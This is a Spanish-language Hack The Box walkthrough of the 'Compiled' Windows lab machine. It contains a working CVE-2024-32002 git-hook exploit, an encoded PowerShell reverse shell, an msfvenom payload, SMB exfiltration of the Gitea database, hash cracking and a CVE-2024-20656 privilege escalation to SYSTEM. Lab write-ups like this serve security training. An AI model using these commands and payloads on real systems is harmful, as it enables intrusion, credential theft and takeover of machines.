---
layout: single
title: Compiled - Hack The Box
excerpt: "Compiled is a medium-difficulty Windows machine featuring a Gitea instance and a web application that clones Git repository URLs on the backend. The server's Git version is vulnerable to [CVE-2024-32002](https://nvd.nist.gov/vuln/detail/CVE-2024-32002), which can be exploited to gain initial access with a Git Bash shell as Richard. By cracking the password hash retrieved from the Gitea database file, the password for user Emily can be obtained. Privilege escalation to Administrator is achieved by exploiting [CVE-2024-20656](https://nvd.nist.gov/vuln/detail/CVE-2024-20656), a vulnerability in the Visual Studio Code version installed on the server."
date: 2025-06-13
classes: wide
header:
  teaser: /img2/compiled.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Medium
tags:
  - Gitea Enumeration
  - Information Leakage
  - Git Exploitation [CVE-2024-32002] (RCE)
  - SQLite Database File Enumeration
  - Creating Hashes in PBKDF2 Format to Get Them Cracked
  - Cracking hashes
  - Microsoft Visual Studio 2019 Exploitation (CVE-2024-20656) [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
❯ nmap -sS --open -p- --min-rate 5000 -n -Pn 10.10.11.26
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 14:57 CEST
Nmap scan report for 10.10.11.26
Host is up (0.034s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
3000/tcp open  ppp
5000/tcp open  upnp
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
```

- Vulnerability and version scan

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 14:58 CEST
Nmap scan report for 10.10.11.26
Host is up (0.046s latency).

PORT     STATE SERVICE    VERSION
3000/tcp open  http       Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=8b22c281dd730e1b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=a0NeN2687zfFtkrRe4fwofk7A9M6MTc1MDA3ODcxOTA1NjYwMDgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 16 Jun 2025 12:58:39 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=16512c4a0ba73b3d; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=gl01eIGShGmq_Hcu-j5LKZmJwoQ6MTc1MDA3ODcxOTczMTg3MTAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 16 Jun 2025 12:58:39 GMT
|_    Content-Length: 0
|_http-title: Git
5000/tcp open  http       Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
|_http-title: Compiled - Code Compiling Services
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=6/16%Time=685014FE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2A84,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:8b22c281dd730e1b;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=a0NeN2687zfFtkrRe4fwofk7A9M6MTc1MDA3ODcxOTA1NjYwMDgwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2016\x20Jun\x202025\x2012:58:39\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\x20re
SF:l=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR2l0I
SF:iwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxl
SF:ZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh
SF:0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZX
SF:MiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowe
SF:d\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-
SF:Cookie:\x20i_like_gitea=16512c4a0ba73b3d;\x20Path=/;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=gl01eIGShGmq_Hcu-j5LKZmJwoQ6MTc1MDA3
SF:ODcxOTczMTg3MTAwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2016\x20Jun\
SF:x202025\x2012:58:39\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.76 seconds
```

>  Dos webs encontradas en los puertos: 3000 y 5000

- Information leakage

![](/img2/Pasted%20image%2020250617123551.png)

> Aquí podemos ver la version de git, la cual parece tener alguna vulnerabilidad

## Exploitation

- RCE via git clone (CVE-2024-32002)

```bash
❯ git config --global protocol.file.allow always
                              
❯ git config --global core.symlinks true
                                       
❯ tell_tale_path="$PWD/tell.tale"

❯ git init hook
```

```ruby
Initialized empty Git repository in /home/pyuser/compiled/hook/.git/
```

```bash
❯ cd hook

❯ mkdir -p y/hooks

❯ cat > y/hooks/post-checkout <<EOF
#!/bin/bash
curl http://10.10.16.7/test
EOF

❯ chmod +x y/hooks/post-checkout

❯ git add y/hooks/post-checkout

❯ git commit -m "post-checkout"

```

```ruby
[main (root-commit) ae3493b] post-checkout
 1 file changed, 2 insertions(+)
 create mode 100755 y/hooks/post-checkout
```

> Primero creamos el repositorio "gancho", el cual abusa del post-checkout. El post-checkout es un archivo que se ejecuta después de hacer un checkout, actuando como un handler. Por eso es necesario poner el código malicioso en ese archivo.

```bash
❯ cd ..

❯ hook_repo_path="$(pwd)/hook"

❯ git init captain
```

```ruby
Initialized empty Git repository in /home/pyuser/compiled/captain/.git/
```

```bash
❯ cd captain

❯ git submodule add --name x/y "$hook_repo_path" A/modules/x
```

```ruby
Cloning into '/home/pyuser/compiled/captain/A/modules/x'...
done.
```

```bash
❯ git commit -m "add-submodule"
```

```ruby
[main (root-commit) 76470fd] add-submodule
 2 files changed, 4 insertions(+)
 create mode 100644 .gitmodules
 create mode 160000 A/modules/x
```

```bash
❯ printf ".git" > dotgit.txt

❯ git hash-object -w --stdin < dotgit.txt > dot-git.hash

❯ printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info

❯ git update-index --index-info < index.info

❯ git commit -m "add-symlink"
```

```ruby
[main ed17d48] add-symlink
 1 file changed, 1 insertion(+)
 create mode 120000 a
```

> Ahora es hora de crear el segundo repositorio principal, el cual crea un enlace simbólico con el objetivo de alterar el contenido del .git. Además es necesario crear un submódulo haciendo referencia al repositorio "gancho" creado anteriormente, de esta forma el contenido del .git hará referencia al repositorio "gancho", que ejecutará automáticamente el post-checkout.

```bash                   
❯ git remote add origin http://10.10.11.26:3000/pyuser/captain.git

❯ git push -u origin main
```

```ruby
Username for 'http://10.10.11.26:3000': pyuser
Password for 'http://pyuser@10.10.11.26:3000': 
Enumerating objects: 8, done.
Counting objects: 100% (8/8), done.
Delta compression using up to 6 threads
Compressing objects: 100% (5/5), done.
Writing objects: 100% (8/8), 605 bytes | 605.00 KiB/s, done.
Total 8 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.11.26:3000/pyuser/captain.git
 * [new branch]      main -> main
branch 'main' set up to track 'origin/main'.
```

```bash
❯ cd ../hook

❯ git remote add origin http://10.10.11.26:3000/pyuser/hook.git

❯ git push -u origin main
```

```ruby
Username for 'http://10.10.11.26:3000': pyuser
Password for 'http://pyuser@10.10.11.26:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Writing objects: 100% (5/5), 335 bytes | 335.00 KiB/s, done.
Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.11.26:3000/pyuser/hook.git
 * [new branch]      main -> main
branch 'main' set up to track 'origin/main'.
```

> Una vez tengamos los repositorios listos es necesario subirlos a gitea.

![](/img2/Pasted%20image%2020250617124307.png)

> Antes de efectuar la vulnerabilidad tenemos que cambiar la url del submódulo.

![](/img2/Pasted%20image%2020250617124342.png)

```bash
❯ python3 -m http.server 80
```

```ruby
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.26 - - [17/Jun/2025 12:34:40] code 404, message File not found
10.10.11.26 - - [17/Jun/2025 12:34:40] "GET /test HTTP/1.1" 404 -
```

> Hacemos una petición a la web la cual por detrás ejecuta el comando git clone. Para comprobar si se está efectuando el RCE podemos probar a ejecutar un curl a nuestra máquina.

- Reverse shell

![](/img2/Pasted%20image%2020250617132303.png)

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.26] 50396
```

```bash
Richard@COMPILED MINGW64 ~/source/cloned_repos/tpq3b/.git/modules/x ((f4cebb1...))
$ whoami
```

```ruby
whoami
Richard
```

> Para efectuar la reverse shell solo necesitamos cambiar el contenido del post-checkout.

- Send windows reverse shell

```bash
Richard@COMPILED MINGW64 ~/source/cloned_repos/tpq3b/.git/modules/x
$ powershell -e 
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwANAAwADAAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

```bash
❯ rlwrap nc -nlvp 4000
```

```ruby
rlwrap: warning: could not set locale
warnings can be silenced by the --no-warnings (-n) option
listening on [any] 4000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.26] 50404
whoami
Richard
PS C:\Users\Richard\source\cloned_repos\tpq3b\.git\modules\x>
```

> Este paso es necesario para escapar de la git bash.

## Post-exploitation

- Find gitea database file

```bash
PS C:\Program Files\Gitea\data> copy gitea.db \\10.10.16.7\smbFolder\
```

```bash
❯ impacket-smbserver smbFolder -smb $(pwd) -smb2support 
```

```ruby
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.26,50435)
[*] AUTHENTICATE_MESSAGE (COMPILED\Richard,COMPILED)
[*] User COMPILED\Richard authenticated successfully
[*] Richard::COMPILED:aaaaaaaaaaaaaaaa:84e1e05d97b970d6dc1475333ffade8b:010100000000000080181a5392dfdb013036b1af69840a6400000000010010006900550065005a00670064006d006900030010006900550065005a00670064006d006900020010006300510078004900770059006800700004001000630051007800490077005900680070000700080080181a5392dfdb01060004000200000008003000300000000000000000000000002000004ac46efaf517468c023da66f7f2fb144e4f0e86d2d1ffe137c993f72a5a2c7490a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.10.11.26,50435)
[*] Remaining connections []
```

> Encontramos el archivo gitea.db en la ruta C:\Program Files\Gitea\data.

- Get hashed data 

```bash
❯ sqlite3 gitea.db 'select name,passwd,salt from user;'
```

```ruby
administrator|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|a45c43d36dce3076158b19c2c696ef7b
richard|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|d7cf2c96277dd16d95ed5c33bb524b62
emily|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|227d873cca89103cd83a976bdac52486
pyuser|7c1bac43dd842c0267bb932ffe564539cf162d893a08f387ef005bc733e94b9097e63b72a78ee16906273aff615a412d9a41|c03e446789ad9c9d43b5625cc0f8c4b4
```

> Antes de crackear los hashes es necesario obtener toda la información necesaria para crear un hash válido para hashcat.

- Prepare PBKDF2 gitea hashes

```bash
❯ hashcat --example-hashes | grep -i "pbkdf2" -C 5| grep -i "SHA256" -C 5
```

```ruby
Hash mode #10900
  Name................: PBKDF2-HMAC-SHA256
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
```

> El Hash mode es el 10900, para crear un hash válido podemos crear un script de python.

```python
import subprocess


def run_command(command):
    command_output=subprocess.check_output(command, shell=True)
    return command_output


def salt(salt):
  salt=run_command(f"echo {salt} | xxd -p -r | base64").decode().strip()
  return salt

def hash(hash):
  hash=run_command(f"echo {hash} | xxd -p -r | base64").decode().strip()
  return hash


command="sqlite3 gitea.db 'select name,passwd,salt from user;'"
sql_list=run_command(command).decode().strip().split("\n")


for i in sql_list:
  print(f"{i.split('|')[0]}:sha256:50000:{salt(i.split('|')[2])}:{hash(i.split('|')[1])}")
```

> En este script se busca crear hashes válidos con la siguiente estructura:

```
sha256:$iterations:$salt:$hash
```

> El salt y el hash tienen que estar en base64, para ello tenemos que decodear el texto en hexadecimal y volver a encodear en base64. El comando para cada uno sería así:

```bash
echo "a45c43d36dce3076158b19c2c696ef7b" | xxd -p -r | base64
```

- Crack PBKDF2 gitea hashes

```bash
❯ python3 exploit.py > hash.txt
```

```bash
❯ hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --username
```

```ruby
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 6924/13913 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 4 digests; 4 unique digests, 4 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
```

```bash
❯ hashcat hash.txt --show --user
```

```ruby
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

emily:sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
```

> Una vez obtenido los hashes en el formato correcto, podemos crackearlo con hashcat. En este caso encontramos la contraseña para el usuario emily.

- Connect with evil-winrm

```bash
❯ evil-winrm -i 10.10.11.26 -u emily -p 12345678
```

```ruby                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Emily\Documents> 
```


- Visual Studio Code Privilege Escalation (CVE-2024-20656)

```bash
*Evil-WinRM* PS C:\Users\Emily\Documents> ls
```

```ruby
    Directory: C:\Users\Emily\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/20/2024   1:55 AM                Visual Studio 2019

```

> Encontramos una pista al conectarnos a la máquina. La versión de Visual Studio parece estar bastante obsoleta.

```bash
*Evil-WinRM* PS C:\ProgramData> .\runas.exe emily 12345678 "cmd /c sc.exe qc VSStandardCollectorService150"
```

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VSStandardCollectorService150
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files (x86)\Microsoft Visual Studio\Shared\Common\DiagnosticsHub.Collection.Service\StandardCollector.Service.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Visual Studio Standard Collector Service 150
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Comprobamos si el servicio VSStandardCollectorService150 está corriendo con el usuario administrador.

```bash
 *Evil-WinRM* PS C:\> dir "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Team Tools\DiagnosticsHub\Collector\VSDiagnostics.exe"
```

```ruby
    Directory: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Team Tools\DiagnosticsHub\Collector


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/20/2024   2:04 AM         124840 VSDiagnostics.**exe**
```

```bash
❯ msfvenom -p windows/shell_reverse_tcp --platform windows LHOST=10.10.16.7 LPORT=9000 -f exe -o reverse.exe
```

```ruby
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

> Antes de crear el exploit necesitamos saber la ruta del archivo VSDiagnostics.exe, además de crear una reverse shell.

![](/img2/Pasted%20image%2020250617234230.png)

![](/img2/Pasted%20image%2020250617234315.png)

![](/img2/Pasted%20image%2020250618112755.png)

> Para crear el exploit necesitamos modificar la ruta del archivo VSDiagnostics.exe y del archivo que se ejecutará. Una vez modificado lo compilamos en modo Release. 

```bash
*Evil-WinRM* PS C:\ProgramData> .\runas.exe emily 12345678 "cmd /c C:\ProgramData\exploit.exe"
```

```ruby
[+] Junction \\?\C:\e0ae216b-72bb-40b8-aeab-14d6decda65d -> \??\C:\e107aee0-b9df-4500-9928-2c90eb275832 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
[+] Junction \\?\C:\e0ae216b-72bb-40b8-aeab-14d6decda65d -> \RPC Control created!
[+] Junction \\?\C:\e0ae216b-72bb-40b8-aeab-14d6decda65d -> \??\C:\e107aee0-b9df-4500-9928-2c90eb275832 created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
[+] Junction \\?\C:\e0ae216b-72bb-40b8-aeab-14d6decda65d -> \RPC Control created!
[+] Persmissions successfully reseted!
[*] Starting WMI installer.
[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
[*] Oplock!
[+] File moved!
```

```bash
❯ nc -nlvp 9000
```

```ruby
listening on [any] 9000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.26] 60882
Microsoft Windows [Versi�n 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\ProgramData\Microsoft\VisualStudio\SetupWMI>whoami
whoami
nt authority\system
```


![](/img2/Pasted%20image%2020250618112539.png)